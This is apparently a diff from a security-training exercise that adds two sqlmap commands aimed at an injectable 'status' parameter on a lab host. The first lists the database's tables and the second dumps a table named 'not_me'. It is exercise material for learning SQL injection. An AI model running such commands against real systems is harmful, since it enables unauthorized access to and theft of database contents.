@@ -1,0 +1,2 @@
+sqlmap -u "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=pending" -p status --tables --batch
+sqlmap -u "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=pending" -p status -T not_me --dump --batch
